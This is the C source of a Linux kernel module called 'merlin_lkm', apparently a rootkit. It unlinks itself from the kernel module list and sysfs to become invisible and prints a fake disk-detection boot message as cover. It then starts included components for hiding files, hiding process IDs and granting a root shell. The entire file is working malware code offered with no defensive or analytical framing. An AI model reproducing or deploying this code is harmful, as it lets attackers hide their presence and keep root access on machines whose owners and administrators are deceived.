#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

# include "../merlin_file_hide/merlin_file_hide.c"
# include "../merlin_shell/merlin_shell.c"
# include "../merlin_pid_hide/pid_hide.c"
// # include "../merlin_port_hide/merlin_port_hide.c"



static struct list_head *prev_module;
void hide(void);

void hide(void)
{
    struct module_use *use, *tmp;

    // Suppression de l'objet kobject du module
    if (THIS_MODULE->mkobj.kobj.state_initialized)
        kobject_del(&THIS_MODULE->mkobj.kobj);

    // Suppression du module de la liste des modules
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    // Parcours de la liste des "utilisationsa" du module et suppression des liens sysfs associés
    list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list) {
        list_del(&use->source_list);
        list_del(&use->target_list);
        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
        kfree(use);
    }
}

static void __init merlin_hide_init(void)
{
    pr_info("[   10.567890] sda: sda1 sda2\n");
    hide();   
}

static int __init merlin_module_init(void)
{
    merlin_hide_init();
    file_hide_init();
    root_shell_init();
    pid_hide_init();
    // port_hide_init();
    return 0;
}


module_init(merlin_module_init)


MODULE_AUTHOR("Phoenix2006");
MODULE_DESCRIPTION("merlin_lkm");
MODULE_LICENSE("GPL");